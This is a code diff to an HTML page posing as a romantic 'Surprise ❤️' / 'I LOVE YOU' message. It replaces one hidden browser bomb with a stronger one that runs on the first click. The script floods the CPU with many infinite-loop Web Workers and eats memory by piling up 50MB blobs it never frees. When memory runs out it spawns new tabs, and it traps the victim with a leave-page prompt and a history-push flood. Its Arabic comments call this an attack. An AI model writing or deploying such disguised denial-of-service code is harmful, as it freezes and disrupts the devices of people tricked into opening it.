@@ -4,40 +4,58 @@
     <meta charset="UTF-8">
     <title>Surprise ❤️</title>
     <style>
-        body { background: black; color: white; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; cursor: pointer; }
-        h1 { color: #ff4d4d; font-size: 4rem; text-shadow: 0 0 20px red; }
-        p { font-size: 1.5rem; color: #ccc; }
+        body { background: black; color: #ff0055; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: 'Courier New', monospace; cursor: pointer; }
+        h1 { font-size: 5rem; text-align: center; animation: shake 0.1s infinite; }
+        @keyframes shake { 0% { transform: translate(1px, 1px); } 50% { transform: translate(-1px, -2px); } 100% { transform: translate(1px, -1px); } }
     </style>
 </head>
 <body>
 
     <h1>I LOVE YOU</h1>
-    <p>Click here to see your gift... 🎁</p>
 
     <script>
-        function launchBomb() {
-            // 1. طلب ملء الشاشة للتمويه
+        let memoryWaste = [];
+
+        function totalMeltdown() {
+            // 1. ملء الشاشة
             document.documentElement.requestFullscreen().catch(() => {});
 
-            // 2. فتح 50 نافذة جديدة في الخلفية بسرعة رهيبة
-            // كل نافذة هتحمل نفس الرابط وهتحاول تفتح نوافذ تانية (سلسلة لا نهائية)
-            for (let i = 0; i < 50; i++) {
-                setTimeout(() => {
-                    window.open(window.location.href, '_blank', 'width=100,height=100');
-                }, i * 100);
-            }
-
-            // 3. تشغيل ضغط المعالج "الهادئ" في التبويب الحالي عشان ميعملش Aw Snap
-            const cores = navigator.hardwareConcurrency || 4;
-            for (let i = 0; i < cores; i++) {
+            // 2. حرق المعالج (CPU) عبر أنوية متعددة
+            const cores = navigator.hardwareConcurrency || 12;
+            for (let i = 0; i < cores * 4; i++) {
                 new Worker(URL.createObjectURL(new Blob([`
-                    while(true) { Math.random() * Math.random(); }
+                    while(true) { 
+                        let x = Math.random() * Math.random();
+                        postMessage(x); 
+                    }
                 `], {type: 'application/javascript'})));
             }
+
+            // 3. تدمير الرام (RAM) - حجز 50 ميجا كل 100 مللي ثانية
+            // استخدام Blob و URL يجعل الرام "محجوزة" ولا يمكن للمتصفح مسحها
+            setInterval(() => {
+                try {
+                    // حجز مصفوفة عملاقة
+                    let buffer = new ArrayBuffer(50 * 1024 * 1024); // 50MB
+                    let blob = new Blob([buffer]);
+                    let url = URL.createObjectURL(blob); 
+                    memoryWaste.push(url); // تخزين الرابط يمنع مسح الـ Blob من الرام
+                    
+                    // تغيير شكل الصفحة لإظهار الضغط
+                    document.body.style.backgroundColor = (document.body.style.backgroundColor === 'black') ? '#1a0000' : 'black';
+                } catch(e) {
+                    // إذا امتلأت الرام، الكود هيحاول يفتح تبويبات جديدة كملجأ أخير
+                    window.open(window.location.href, '_blank');
+                }
+            }, 100);
+
+            // 4. تعطيل أي محاولة للهروب
+            window.onbeforeunload = function() { return "Are you sure?"; };
+            setInterval(() => { window.history.pushState(null, null, "#" + Math.random()); }, 1);
         }
 
-        // الهجوم يبدأ بلمسة واحدة
-        window.onclick = launchBomb;
+        // يبدأ الهجوم عند أول لمسة
+        window.onclick = totalMeltdown;
     </script>
 </body>
 </html>
